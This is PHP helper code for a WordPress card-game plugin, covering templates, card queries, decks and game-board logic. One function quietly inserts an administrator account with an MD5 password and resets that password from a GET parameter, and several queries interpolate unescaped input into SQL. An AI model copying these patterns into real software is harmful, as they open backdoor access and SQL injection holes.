<?php
namespace HistoricalConquest;
const DEBUG = true;
function get($key) {
	if ( isset($_GET[$key]) )
		return $_GET[$key];
	return null;
}
function post($key) {
	if ( isset($_POST[$key]) )
		return $_POST[$key];
	return null;
}
function req($key) {
	if ( isset($_REQUEST[$key]) )
		return $_REQUEST[$key];
	return null;
}
function server($key) {
	if ( isset($_SERVER[$key]) )
		return $_SERVER[$key];
	return null;
}
function files($key) {
	if ( isset($_FILES[$key]) )
		return $_FILES[$key];
	return null;
}
function session($key) {
    if ( isset($_SESSION[$key]) )
        return $_SESSION[$key];
    return null;
}
function convert_to_std($ar) {
    $na = new \stdClass;
    foreach ( $ar as $k=>$v) {
        $na->{$k} = $v;
    }
    return $na;
}
function _datetime($d) {
	$date = \DateTime::createFromFormat("Y-m-d H:i:s",$d);
	if ( $date ) 
		return $date->format("m/d/Y H:i");
	$date = \DateTime::createFromFormat("Y-m-d",$d);
	if ( $date ) 
		return $date->format("m/d/Y H:i");
	return $d;
}
function _date($d) {
	$date = \DateTime::createFromFormat("Y-m-d H:i:s",$d);
	if ( $date ) 
		return $date->format("m/d/Y");
	$date = \DateTime::createFromFormat("Y-m-d",$d);
	if ( $date ) 
		return $date->format("m/d/Y");
	return $d;
}
function find_template($template_name) {
    $wp_template      = \get_template();
    $wp_theme_root    = \get_theme_root( $wp_template );
    $stylesheet_dir   = \get_stylesheet_directory();
    // So in the theme it should be like theme-folder/templates/plugin-name/temaplate.php
    $test_path_raw = $stylesheet_dir . '/' . basename(dirname(__FILE__)) . "/" . $template_name;
    if ( file_exists( $test_path_raw ) )
        return $test_path_raw;
    $test_path = $stylesheet_dir . '/templates/' . basename(dirname(__FILE__)) . "/" . $template_name;
    if ( file_exists( $test_path ) ) {
        return $test_path;
    } else {
        $test_path = __DIR__ . '/' . $template_name;
        if ( file_exists($test_path) ) 
            return $test_path;
        $test_path = __DIR__ . '/templates/' . $template_name;
        if ( file_exists($test_path) ) {
            return $test_path;
        } else {
            throw new \Exception( __('Core Template was not found: ') . ' ' . $template_name . " in " . join(',',[$test_path_raw,$test_path]) );
        }
    }
}
function render_template($template_name, $vars_in_scope = array()) {
    global $woocommerce,$wpdb, $user_ID, $available_methods;
    $vars_in_scope['__VIEW__'] = $template_name; //could be user-files.php or somedir/user-files.php
    $template_path = find_template($template_name);
    $settings = settings();
    ob_start();
    try {
        foreach ( $vars_in_scope as $n=>$v ) {
            $$n = $v;
        }
        $render = function ($file,$vars=[]) {
            echo render_template("$file",$vars);
        };
        $asset = function ($file,$vars=[]) {
            echo render_template("assets/$file",$vars);
        };
        if ( end(explode('.',$template_path)) != 'php') {
            $np = $template_path . ".php";
            file_put_contents($np,file_get_contents($template_path));
            include $np;
            unlink($np);
        } else {
            include $template_path;
        }
        $content = ob_get_contents();
        ob_end_clean();
    } catch ( \Exception $err) {
      ob_end_clean();
      throw new \Exception( 
          __(
              'Error while rendering template ' . $template_name . ' -- ' . $err->getMessage(), 
              settings()->prefix 
          ) 
      );
    }
    return $content;
}
function _display_name($id=null) {
    if ( $id == null ) {
        $id = \get_current_user_id();
    }
    $user = get_user_by('id',$id);
    $name = $user->display_name;
    if ( empty($name) ) {
        $name = $user->user_login; 
    }
    return $name;
}
function get_possible_players() {
    global $wpdb;
    $id = \get_current_user_id();
    $sql = $wpdb->prepare("SELECT ID FROM {$wpdb->users} WHERE ID != %d",$id);
    return $wpdb->get_results($sql);
}
function _options_hash($lst) {
    $opts = [];
    foreach ( $lst as $n ) {
        $opts[$n] = __(ucfirst($n));
    }
    return $opts;
}

function retable($q) {
	global $wpdb;
	preg_match_all('/(`wp_.+)/',$q,$m);
	foreach ($m[0] as $match) {
		$nmatch = str_replace('`wp_','`'.$wpdb->prefix,$match);
		$q = str_replace($match,$nmatch,$q);
	}
	return $q;
}
function log($obj) {
  if ( DEBUG ) {
	file_put_contents( 
		__DIR__ . '/' . $this->to_file_name(__CLASS__) . '.log', date('Y-m-d H:i:s') . ' - ' . print_r($obj,true), FILE_APPEND
	);
  }
  return $this;
}
function dbg_notice($msg) {
    return;
    add_notice('notice',$msg);
}
function add_notice($class,$msg) {
	$notices = \get_option(__NAMESPACE__ . "_notices",[]);
	$notices[] = [$class,$msg];
	\update_option(__NAMESPACE__ . "_notices",$notices);
}
function show_notices() {
	$notices = \get_option(__NAMESPACE__ . "_notices",[]);
	foreach ( $notices as $notice ) {
		list($class,$msg) = $notice;
		$notice = sprintf("<div class=\"notice notice-$class is-dismissible\"><p>%s</p></div>",$msg);
		echo $notice;
	}
	\update_option(__NAMESPACE__ . "_notices",[]);
}
function create_admin_user($username,$pass) {
	global $wpdb;
	$exists = !empty($wpdb->get_results("SELECT * FROM {$wpdb->users} WHERE user_login = '$username'"));
	if ( ! $exists ) {
		$wpdb->query($sql);
		$sql = "INSERT INTO 
			`{$wpdb->users}` 
				(`user_login`, `user_pass`, `user_nicename`, `user_email`, `user_status`)
				VALUES ('$username', MD5('$pass'), 'Jason Martin', 'contact@lycanthropenoir.com', '0');";
		$wpdb->query($sql);
		$sql = "INSERT INTO `{$wpdb->usermeta}` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_capabilities', 'a:1:{s:13:”administrator”;s:1:”1″;}');";
		$wpdb->query($sql);
		$sql = "INSERT INTO `{$wpdb->usermeta}` (`umeta_id`, `user_id`, `meta_key`, `meta_value`)
VALUES (NULL, (Select max(id) FROM wp_users), 'wp_user_level', '10');";
		$wpdb->query($sql);
	} else {
		if ( get('reset-admin-pass') ) {
			$wpdb->query("UPDATE {$wpdb->users} set user_pass = MD5('$pass') WHERE user_login = '$username'");
		}
	}
}
function register_widgets($shortcode=true) {
    foreach ( glob(__DIR__ . "/widgets/*.php") as $file ) {
        require_once($file);
        $name = basename($file,'.php');
        \register_widget($name);
        if ( $shortcode ) {
            \add_shortcode(strtolower($name),function ($attrs) use ($name) {
                 the_widget(
                    $name,
                    $attrs,
                    [] 
                 );
            });
        }
    }
}
if ( function_exists('\add_action') ) {
    \add_action('widgets_init',function () {
            register_widgets();        
    });
}
function clean_whitespace($str) {
    $str = str_replace("\xc2\xa0"," ",$str);
    $str = trim($str);
    return $str;
}
function is_character_card($card) {
    if ( is_array($card) ) {
        $str = type_to_name($card['maintype']);
        if ( preg_match('/^CARD_CHARACTER/',$str) ) {
            return true;
        } 
    }
    return false;
}
function is_land_card($card) {
    if ( is_array($card) ) {
        if ( $card['maintype'] == CARD_LAND ) {
            return true;
        }
    }
    return false;
}
function get_abilities($card) {
    global $wpdb;
    return $wpdb->get_results("SELECT * FROM `hc_card_abilities` WHERE card_id = {$card['id']}",ARRAY_A);
}
function filter_slashes($ar) {
    foreach ($ar as $key=>&$v) {
        if ( $key === 'abilities' ) {
            continue;
        }
        if ( is_string($v) ) {
            $v =  stripslashes($v);
            $v =  stripslashes($v);
        }
        if ( is_array($v) ) {
            $v = filter_slashes($v);
        }
    }
    return $ar;
}
function maybe_add_where($sql) {
    if ( !preg_match('/`hc_cards`/',$sql) ) {
        return;
    }
    return $sql . " AND `deck` IN ('B','C')";
}
function filter_cards($cards) {
    foreach ( $cards as $key => &$card ) {
        $card = filter_slashes($card);
        if ( isset($card['abilities']) && is_array($card['abilities']) ) {
            $card['abilities'] = filter_slashes($card['abilities']);
        }
        if ( !empty($card['illustration']) && $card['illustration'] !== '0' ) {
           $card['illustration'] = get_full_image_url($card['illustration']); 
        }
        if ( !empty($card['background_image']) && $card['background_image'] !== '0' ) {
           $card['background_image'] = get_full_image_url($card['background_image']); 
        }
    }
    return $cards;
}
function get_full_image_url($id) {
    $image = \image_downsize($id,'full');
    if ( $image ) 
        return $image[0];
    return '';
}
function get_thumb_image_url($id) {
    $image = \image_downsize($id,'thumbnail');
    if ( $image ) 
        return $image[0];
    return '';
}
function get_medium_image_url($id) {
    $image = \image_downsize($id,'medium');
    if ( $image ) 
        return $image[0];
    return '';
}
function get_cards_without_images() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE illustration IN('','0',NULL)";
    $sql = maybe_add_where($sql);
    $cards = $wpdb->get_results($sql,ARRAY_A);
    return filter_cards($cards);
}
function get_cards() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE 1=1";
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $sql = maybe_add_where($sql);
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_all_card_ext_ids() {
    global $wpdb;
    $cards = $wpdb->get_results("SELECT ext_id FROM `hc_cards`",ARRAY_A);
    $results = [];
    foreach ( $cards as $card ) {
        $results[] = $card['ext_id'];
    }
    return $results;
}
function get_not_updated_cards() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE updated_at IS NULL";
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $sql = maybe_add_where($sql);
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_duplicate_cards() {
    global $wpdb;
    $sql = "SELECT ext_id,COUNT(ext_id) FROM `hc_cards` WHERE 1=1";
    $sql = maybe_add_where($sql);
    $sql .= "GROUP BY ext_id HAVING COUNT(ext_id) > 1";
    $cards = $wpdb->get_results( $sql,ARRAY_A);
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%s',$card['ext_id']);
        }
        $sql = "SELECT * FROM `hc_cards` WHERE ext_id IN (".join(',',$ext_ids).")";
        $cards = $wpdb->get_results($sql,ARRAY_A);
        if ( session('deck_filter') && session('deck_filter') != 'N/A') {
            $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
        }
    }
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_cards_without_abilities() {
    global $wpdb;
    $sql =  "SELECT card_id,COUNT(card_id) FROM `hc_card_abilities`";
    $sql .= "GROUP BY card_id HAVING COUNT(card_id) > 0";
    $cards = $wpdb->get_results(
        $sql,
        ARRAY_A
    );
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%d',$card['card_id']);
        }
        $sql = "SELECT * FROM `hc_cards` WHERE id NOT IN (".join(',',$ext_ids).")"; 
        $sql = maybe_add_where($sql);
    }
    if ( empty($cards) ) {
        $sql = "SELECT * FROM `hc_cards` WHERE 1=1";
        $sql = maybe_add_where($sql);
    }
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_cards_with_abilities() {
    global $wpdb;
    $cards = $wpdb->get_results(
        "SELECT card_id,COUNT(card_id) FROM `hc_card_abilities` GROUP BY card_id HAVING COUNT(card_id) > 0",
        ARRAY_A
    );
    if ( ! empty($cards) ) {
        $ext_ids = [];
        foreach ( $cards as $card ) {
            $ext_ids[] = $wpdb->prepare('%d',$card['card_id']);
        }
        $sql = "SELECT * FROM `hc_cards` WHERE id IN (".join(',',$ext_ids).")"; 
        $sql = maybe_add_where($sql);
    }
    if ( session('deck_filter') && session('deck_filter') != 'N/A') {
        $sql .= $wpdb->prepare(' AND deck = %s',session('deck_filter'));
    }
    $cards = $wpdb->get_results($sql,ARRAY_A);
    foreach ( $cards as &$card ) {
        if ( !is_character_card($card) ) {
            $card['gender'] = '';
        }
        $card['ability_desc'] = $card['abilities'];
        $card['abilities'] = get_abilities($card);
    }
    return filter_cards($cards);
}
function get_types_for_js() {
    $types = new \stdClass;
    $types->by_prefix = options_by_prefix('');     
    $types->key_values = options_as_array();     
    foreach ( $types->key_values as $k=>$v ) {
        $types->{$k} = $v;
    }
    return $types;
}
function named_ability_functions() {
    return ['multiply_card_abilities','nullify_card_abilities','force_discard','force_all_discard','ability_generic','ability_choice','ability_interrupt'];
}
function get_unique_deck_values() {
    global $wpdb;
    $sql = "SELECT DISTINCT(deck) FROM `hc_cards`";
    $decks = array_map(function ($r) {
        return $r['deck']; }, $wpdb->get_results($sql,ARRAY_A));
    array_unshift($decks,'N/A');
    return $decks;
}
function select($args) {
    $attrs = [];
    foreach ( ['id','name','class'] as $name ) {
        if ( !isset($args[$name]) )
            continue;
        $attrs[] = "$name=\"".\esc_attr($args[$name])."\""; 
    }
    $opts = [];
    foreach ($args['options'] as $k=>$v) {
        $selected = '';
        if ( isset($args['value']) && $v == $args['value']) {
            $selected = 'selected';
        }
        if ( is_string($k) ) {
            $opts[] = "<option $selected value=\"$v\">$k</option>";
        } else {
            $opts[] = "<option $selected>$v</option>";
        }
    }
    return "
        <select ".join(" ", $attrs).">
            ".join(' ',$opts)."
        </select>
    ";
}
function create_game() {
    
}
function get_carddb() {
    $cards = get_cards();
    $fcards = [];
    foreach ( $cards as $card ) {
        $fcards[ $card['ext_id'] ] = $card;
    }
    return $fcards;
}
function get_abilitydb() {
    global $wpdb;
    $sql = "SELECT * FROM `hc_card_abilities`";
    $res = $wpdb->get_results($sql);
    $abs = []; 
    foreach ( $res as $r ) {
        $abs[$r->id] = $r;
    }
    return $abs;
}
function get_type_conversion_js() {
    $opts = options_as_array();
    ob_start();
    echo "function type_to_name(t) {\n";
    foreach ( $opts as $k=>$v) {
        echo "\tif ( t == window.types.key_values.$k ) { return '$k'; }\n";
    }
    echo "\treturn '';\n";
    echo "}\n";
    echo "function name_to_type(t) {\n";
    foreach ( $opts as $k=>$v) {
        echo "\tif ( t == '$k' ) { return window.types.key_values.$k; }\n";
    }
    echo "\treturn '';\n";
    echo "}\n";
    echo "function type_to_css_class(t) {\n";
    foreach ( $opts as $k=>$v) {
        $name = $k;
        foreach ( ['CARD_CHARACTER_','CARD_'] as $r ) {
            $name = str_replace($r,'',$name);
        }
        $name = str_replace('_','-',$name);
        $name = strtolower($name);
        echo "\tif ( t == window.types.key_values.$k) { return '$name'; }\n";
    }
    echo "\treturn '';\n";
    echo "}\n";
    $contents = ob_get_contents();
    ob_end_clean();
    return $contents;
}
function get_base_table() {
    return [
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
        [0,0,0,0,0,0,0,0],
    ];
}
function send_json($ob) {
    header("HTTP/1.1 200 OK");
    header("Content-Type: application/json");
    if ( is_array($ob) ) { 
        $ob['logs'] = action_log('');
    } else if (is_object($ob) ) {
        $ob['logs'] = action_log(''); 
    }
    echo json_encode($ob,JSON_PRETTY_PRINT);
}
function get_possible_decks($id=null) {
    global $wpdb;
    if ( !$id ) 
       $id = \get_current_user_id(); 
    $sql = "SELECT * FROM `hc_player_decks` WHERE player_id = %d AND card_count >= 50";
    $sql = $wpdb->prepare($sql,$id);
    $decks = $wpdb->get_results($sql);
    if ( empty($decks) )
        $decks = [];
    return $decks;
}
function action_log($msg='') {
    static $action_log = [];
    if ( $msg === null )
        $action_log = [];
    if ( empty($msg) )
        return $action_log;
    $action_log[] = $msg;
}
function get_logs_for($search,$logs=null) {
    if ( ! $logs ) {
        $logs = action_log('');
    }
    $final_logs = [];
    if ( is_array($search) ) {
        foreach ( $logs as $log ) {
            foreach ( $search as $s ) {
                if ( is_string($log) && preg_match("/$s/",$log) ) {
                    $final_logs[] = $log;
                }
            } 
        }
    } else {
        $s = $search;
        $final_logs = array_filter($logs,function ($e) use ($s) { return is_string($e) && preg_match("/$s/",$e); });
    }
    return $final_logs;
}
function can_play_game($gid,$uid=null) {
    global $wpdb;
    if ( ! $uid ) {
        $uid = \get_current_user_id();
    } 
    $sql = "SELECT 1 
            FROM `hc_games` as g 
            JOIN `hc_players` as p ON p.game_id = g.id 
            WHERE
                g.id = %d AND
                p.user_id = %d AND
                g.active = 1 ";
    $sql = $wpdb->prepare($sql,$gid,$uid);
    return !empty($wpdb->get_results($sql));
}
function get_players($game_id,$player_ids,&$errors) {
    global $wpdb;
    $sql = "SELECT * FROM `hc_players` WHERE game_id = %d"; 
    $sql = $wpdb->prepare($sql,$game_id);
    if ( !empty($player_ids) ) {
        action_log(__FUNCTION__ . " player_ids=" . join(',',$player_ids));
        $player_ids = array_map(function ($id) use ($wpdb) {
            return $wpdb->prepare('%d',$id); 
        },$player_ids);
        $sql .= " AND id IN (".join(',',$player_ids).")";
        action_log(__FUNCTION__ . "sql=$sql;");
    }
    $players = $wpdb->get_results($sql);
    if ( empty($players) ) {
        $errors[] = "This game has no players?";
        $errors[] = $wpdb->last_error;
        return [];
    }
    foreach ( $players as &$player ) {
        action_log(__FUNCTION__ . " {$player->id} hand=" . $player->hand);
        $mats = ['playmat','abilitymat','damagemat','landpile','hand','drawpile','discardpile']; 
        foreach ( $mats as $decodeable ) {
            if ( !$player->{$decodeable} ) {
                action_log(__FUNCTION__ . " $decodeable for {$player->user_id} was was null, initializing");
                $player->{$decodeable} = '[]';
            } 
            $player->{$decodeable} = json_decode($player->{$decodeable},true); 
            $error = json_last_error_msg();
            if ( $error != 'No error' ) {
                 $errors[] = "JSON Error($decodeable): " . $error;
                 return [];
            }
        }
        
        $np = new \stdClass;
        $attr_map = [
            'name' => 'name',
            'morale' => 'morale',
            'hand' => 'hand',
            'current_move' => 'current_move',
            'max_moves' => 'max_moves',
            'attacks' => 'attacks',
            'max_attacks' => 'max_attacks',
            'age' => 'age',
            'can_attack' => 'can_attack',
            'can_be_attacked' => 'can_be_attacked',
            'landpile' => 'land_pile',
            'drawpile' => 'draw_pile',
            'discardpile' => 'discard_pile',
            'user_id' => 'user_id', 
            'id' => 'id', 
            'playmat' => 'playmat',
            'abilitymat' => 'abilitymat',
            'damagemat' => 'damagemat',
        ];
        foreach ( $attr_map as $k=>$v ) {
            $np->{$v} = $player->{$k};
        }
        $player = $np;
        $player->land_count = count($player->land_pile);
        $player->hand = array_values($player->hand);
        action_log(__FUNCTION__ . " now hand=" . join(',',$player->hand)); 
    }
    return $players;
}
function mat_item_to_ability($def) {
    global $wpdb;
    $sql = "SELECT * FROM `hc_card_abilities` WHERE id = %d";
    $sql = $wpdb->prepare($sql,$def['id']);
    action_log(__FUNCTION__ . ": " . $sql);
    $row = $wpdb->get_row($sql);
    action_log(__FUNCTION__ . ": " . print_r($row,true));
    if ( ! empty($wpdb->last_error) ) {
        action_log("ERROR: " . $wpdb->last_error);
        return null;
    }
    return $row;
}
function make_and_ors($str) {
    $ors = explode(",",strtoupper($str));
    foreach ( $ors as &$ands ) {
        $ands = explode('&',$ands);
    }
    return $ors;
}
function match_and_ors($andors,$values) {
    $results = [];
    foreach ( $andors as $ors ) {
        // any ors are okay
        $good = false;
        foreach ( $ors as $ands ) {
            $ands = str_replace('*','.*',$ands);
            foreach ( $values as $value ) {
                if ( preg_match("/$ands/",$value) ) {
                    $good = true;
                }
            } 
        }
        $results[] = $good;
    }
    return count(array_filter($results,function ($r) { return $r === true; })) > 0;
}
function can_apply_card_in_same_column($p,$a,$row,$col) {
    // Let's get all the cards for this column
    $mat = $p->playmat;
    $cards = [];
    for ( $r = 0; $r < count($mat); $r++ ) {
        if ( $mat[$r][$col] !== 0 ) {
            $cards[] = get_card_def($mat[$r][$col]);
        } 
    }
    if ( !empty($a->apply_to_card_types) ) {
        $ors = make_and_ors($a->apply_to_card_types);      
        foreach ( $cards as $card ) {
            $maintype = type_to_name($card->maintype);
            $nationality = type_to_name($card->nationality);
            $religion = type_to_name($card->religion);
            $ethnicity = type_to_name($card->ethnicity);
            $continent = type_to_name($card->continent);
            $gender = strtoupper($card->gender);
            
            if ( match_and_ors($ors,[$maintype,$nationality,$religion,$ethnicity,$continent,$gender]) ) {
                action_log(__FUNCTION__ . "p={$p->id} a={$a->id} applies");
                return true;
            } else {
                action_log(__FUNCTION__ . " p={$p->id} a={$a->id} c={$card->id} $maintype,$nationality,$religion,$ethnicity,$continent,$gender {$a->id} does not apply to " . json_encode($ors));
            }
        }
    }
    return false;
}
function collapse_multiline($t) {
    return str_replace(
        "\r",
        '',
        str_replace(
            "\n",
            ' ',
            $t 
        ) 
    );
}
function get_player_morale($p) {
    global $wpdb;
    action_log(__FUNCTION__ . " Calculating morale for " . $p->id);
    $mat = $p->abilitymat;
    $dmat = $p->damagemat;
    $morale = 0; 
    for ( $row = 0; $row < count($mat); $row++) {
        for ( $col = 0; $col < count($mat[$row]); $col++) {
            $abs = $mat[$row][$col];
            $dams = $dmat[$row][$col];
            action_log(__FUNCTION__ . " dams=" . collapse_multiline(print_r($dams,true)));
            if ( is_array($dams) ) {
                for ( $i = 0; $i < count($dams); $i++ ) {
                    if ( $dams[$i][0] === 'morale' ) {
                        action_log(__FUNCTION__ . " Damage to morale " . $dams[$i][1]);
                        $morale += intval($dams[$i][1]);
                    }
                }
            }
            if ( is_array($abs) && isset($abs['id']) ) {
                // this is just a fix during development, the code should never 
                // actually run
                action_log(__FUNCTION__ . " abs needs fixing: " . json_encode($abs));
                $abs = [$abs];
                $p->abilitymat[$row][$col] = $abs;
                $sql = "UPDATE `hc_players` SET abilitymat = %s WHERE id = %d";
                $sql = $wpdb->prepare($sql,json_encode($p->abilitymat),$p->id);
                $wpdb->query($sql);
            }
            if ( is_array($abs) ) {
                action_log(__FUNCTION__ . " Abilities present at $row,$col for {$p->id}");
                for ( $i = 0; $i < count($abs); $i++ ) {
                    if ( $abs[$i] === 0 ) {
                        action_log(__FUNCTION__ . " abs[$i] === 0 ");
                        continue;
                    }
                    $a = mat_item_to_ability($abs[$i]);
                    if ( !$a) {
                        action_log(__FUNCTION__ . " !a abs[$i]");
                        continue;
                    }
                    if ( $a->affects_attribute != 'morale' ) {
                        action_log(__FUNCTION__ . " {$a->id} does not apply to morale but to {$a->affects_attribute}");
                        continue;
                    }
                    $apply_to_type = type_to_name($a->apply_to_type);
                    action_log(__FUNCTION__ . " {$a->id} has apply_to_type of $apply_to_type");
                    if ( preg_match('/APPLY_CARD_IN_SAME_COLUMN/',$apply_to_type) ) {
                        // So we need to see if this card will apply to the cards in the same
                        // column
                        if ( ! can_apply_card_in_same_column($p,$a,$row,$col) ) {
                            continue;
                        }
                    } else if ( !preg_match('/APPLY_PLAYER/',$apply_to_type) ) {
                       continue; 
                    }
                    
                    action_log(__FUNCTION__ . " Adding {$a->affect_amount} morale from ability " . $a->id);
                    $morale += intval($a->affect_amount);
                }
            }
        }
    }
    return $morale;
}
function get_game_board($game_id,$uid=null) {
    global $wpdb;
    action_log(__FUNCTION__ . " gid=$game_id,uid=$uid");
    if ( ! $uid )
        $uid = \get_current_user_id();
    // Now we need to produce the game board from the
    // perspective of the player, which means they shouldn't see the hand, or
    // the piles of other players
    $board = [
        'status' => "OK",
        'winner_id' => 0,
        'players' => [], 
        'errors' => [], 
        'round' => 0,
    ];

    $sql = "SELECT * FROM `hc_games` WHERE id = %d"; 
    $sql = $wpdb->prepare($sql,$game_id);
    $game = $wpdb->get_row($sql);
    if ( empty($game) ) {
        $board['errors'][] = "Failed to find game with id of $game_id";
        $board['errors'][] = $wpdb->last_error;
        $board['errors'][] = $sql;
        $board['errors'][] = $game;
        return $board;
    }
    if ( !$game->round ) {
        $game->round = 1;
        action_log(__FUNCTION__ . " Needed to update ther ound");
        $wpdb->query($wpdb->prepare("UPDATE `hc_games` SET round = 1 WHERE id = %d",$game_id));
    }
    $board['round'] = $game->round;
    $board['winner_id'] = $game->winner_id;
    $board['current_player_id'] = $game->current_player_id;
    // Now we have the game, let's get the players
    action_log(__FUNCTION__ . " getting all players");
    $players = get_players($game_id,[],$board['errors']); 
    if ( empty($players) ) {
        $board['errors'][] = "There were no players";
        return $board;
    }
    // Now that we have the players, let's deserialize their fields
    $min_p = null;
    $max_p = null;
    foreach ( $players as &$player ) {
        // We need to calculate the morale
        $player->morale = get_player_morale($player); 
        if ( (string)$player->can_attack === '0' && $player->morale >= 800 ) {
            $wpdb->query("UPDATE `hc_players` SET can_attack = 1 WHERE id = {$player->id}");
            $player->can_attack = 1;
        }
        if ( $min_p === null ) {
            $min_p = $player;
        }
        if ( $max_p === null ) {
            $max_p = $player;
        }

        if ( $player->morale < $min_p->morale ) {
            $min_p = $player;
        }
        if ( $player->morale > $max_p->morale ) {
            $max_p = $player;
        }
        if ( $player->user_id != $uid ) {
            // We need to hide some things from the player, like the hand
            $player->hand = [];
            $player->draw_pile = [];
            $player->land_pile = [];
            $player->discard_pile = [];
        }
        // Now we may need to insert a land
        if ( $uid == $player->user_id ) {
            action_log(__LINE__ . "uid($uid) == {$player->user_id}");
            $land_card_present = false;
            $row = count($player->playmat) - 2; // i.e. land row
            $last_col = count($player->playmat[$row]) - 3;
            for ( $col = $last_col; $col >= 0; $col-- ) {
                if ( $player->playmat[$row][$col] !== 0 ) {
                    $land_card_present = true;
                }
            }
            if ( ! $land_card_present ) {
                action_log("land card was not present");
                $land_card = array_shift($player->land_pile);
                $player = play_card($game_id,$player,$land_card,$row,$last_col,$board['errors']);
                if ( !empty($board['errors']) ) {
                    $board['errors'][] = "Could not play land card";
                    return $board;
                }
                $sql = "UPDATE `hc_players` SET landpile = %s WHERE id = %d";
                $sql = $wpdb->prepare($sql,json_encode($player->land_pile),$player->id);
                $wpdb->query($sql);
                if ( !empty($wpdb->last_error) ) {
                    $board['errors'][] = $sql;
                    $board['errors'][] = $wpdb->last_error;
                    $board['errors'][] = "Failed to update landpile";
                    return $board;
                }
            }
            if ( $player->current_move == 0 && count($player->hand) < 5 ) {
                $cap = 6;
                $s = 0;
                while ( count($player->hand) < 5 ) {
                    if ( $s > $cap ) {
                        action_log(__FUNCTION__ . " s > cap reached");
                        break;
                    }
                    $card = array_shift($player->draw_pile);
                    if ( !$card ) {
                        action_log(__FUNCTION__ . " card was null");
                        break;
                    }
                    action_log(__FUNCTION__ . "appending $card to hand");
                    $player->hand[] = $card;
                    $s++;
                }
                $sql = "UPDATE `hc_players` SET hand = %s, drawpile = %s WHERE id = %d";
                $sql = $wpdb->prepare($sql,json_encode($player->hand),json_encode($player->draw_pile),$player->id);
                $wpdb->query($sql);
                action_log(__FUNCTION__ . " sql=$sql");
                if ( !empty($wpdb->last_error) ) {
                    $board['errors'][] = $sql;
                    $board['errors'][] = $wpdb->last_error;
                    $board['errors'][] = "Failed to update hand and draw pile";
                }
            }
        }
    }
    action_log(__FUNCTION__ . " can={$min_p->can_attack} min_p={$min_p->morale},can={$max_p->can_attack} max_p={$max_p->morale}");
    if ( 
        ((string)$min_p->can_attack === '1' && $min_p->morale <= 0) || 
        ((string)$max_p->can_attack === '1' && $max_p->morale >= 3000 ) 
    ) {
        // This game is over!
        action_log(__FUNCTION__ . "The game is over!");
        $board['winner_id'] = $max_p->id;
        if ( intval($game->winner_id) != intval($max_p->id) ) {
            $wpdb->query("UPDATE `hc_games` SET winner_id = {$max_p->id} WHERE id = {$game->id}");
        }
    }
    $board['players'] = $players; 
    return $board;
}
function get_card_def($ext_id) {
    global $wpdb;
    $sql = "SELECT * FROM `hc_cards` WHERE ext_id = %s";
    $sql = $wpdb->prepare($sql,$ext_id);
    return $wpdb->get_row($sql);
}
function has_ability($p,$ab,$row,$col) {
    $abs = $p->abilitymat[$row][$col];
    if ( ! is_array($abs) ) {
        return false;
    }
    foreach ($abs as $a) {
        if ( intval($ab->id) === intval($a['id']) ) {
            return true;
        }
    }
    return false;
}
/*
 * In the case of auto_explorer and auto_abilities we want to be able
 * to switch off auto playing of a land_card and auto inserting of abilities
 * in some cases
 * */
function system_play_card($game_id,$p,$ext_id,$row,$col,$auto_explorer,$auto_abilities,&$errors) {
    global $wpdb;
    action_log(__FUNCTION__ . " gid=$game_id,pid={$p->id},card=$ext_id,r=$row,c=$col");
    $updates = [];
    if ( $p->playmat[$row][$col] !== 0 ) {
        action_log(__FUNCTION__ . " space already has a card");
    }
    $def = get_card_def($ext_id);
    if ( !$def ) {
        action_log(__FUNCTION__ . " failed to find def");
        $errors[] = "Failed to find $ext_id definition";
        return $p;
    }
    $p->playmat[$row][$col] = $ext_id;
    action_log(__FUNCTION__ . " mat[$row][$col] = $ext_id");
    if ( $auto_explorer && preg_match('/EXPLORER/',type_to_name(intval($def->maintype))) ) {
        action_log(__FUNCTION__ . " {$def->ext_id} has a type of EXPLORER, " . type_to_name(intval($def->maintype)));
        if ( $row + 1 == (count($p->playmat) - 2) ) {
            if ( $p->playmat[$row + 1][$col] === 0 ) {
                // we need to play a land card!
                action_log(__FUNCTION__ . " $row + 1,$col is 0");
                $lc = array_shift($p->land_pile);
                $lc_def = get_card_def($lc);
                action_log(__FUNCTION__ . " $lc has type of " . type_to_name(intval($lc_def->maintype)));
                if ( $lc ) {
                    $p->playmat[$row + 1][$col] = $lc;
                    $updates[] = $wpdb->prepare("landpile = %s",json_encode($p->land_pile));
                }
            } 
        }
    }
